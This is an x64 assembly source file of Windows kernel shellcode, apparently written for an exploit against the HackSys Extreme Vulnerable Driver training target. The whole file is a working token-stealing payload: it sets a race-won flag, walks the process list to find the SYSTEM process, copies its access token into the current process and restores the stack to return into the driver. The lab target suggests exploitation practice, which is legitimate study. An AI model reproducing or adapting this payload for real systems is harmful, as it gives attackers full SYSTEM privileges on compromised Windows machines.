.CODE

Shellcode PROC
	; NOTE:								      avoid changing non-volatile registers:
										        ; rbx, r12, r13, r14, r15
									
	stop_user_threads:
		mov rax, r11					  ; r11 contains a pointer to the raceWon global var
		mov rax, [rax]					; move address of raceWon in to rax
		mov rcx, 01h					  ; move 0x1 in to rcx
		mov [rax], rcx					; set raceWon var to 1

	start:
		mov rax, gs:[0188h]			; get current thread (_KTHREAD)
		mov rax, [rax+0b8h]			; get current process (_KPROCESS)
		mov r8, rax						  ; store _EPROCESS in r8

	loop_start:
		mov r8, [r8+0448h]			; get ActiveProcessLinks
		sub r8, 0448h					  ; get current process (_EPROCESS)
		mov rcx, [r8+0440h]			; get UniqueProcessId (PID)
		cmp rcx, 04h					  ; compare PID to SYSTEM PID 
		jne loop_start					; loop until SYSTEM PID is found

	apply_token:
		mov rcx, [r8+04b8h]			; SYSTEM token is @ offset _EPROCESS + 0x4b8
		and cl, 0f0h					  ; clear out _EX_FAST_REF RefCnt
		mov [rax+04b8h], rcx		; copy SYSTEM token to current process

	recover_stack:
		mov rax, 0c0000001h			; expected return value from hevd function
		add rsp, 010h					  ; reallign stack to return value
		ret								      ; ret back to driver code
Shellcode ENDP

END
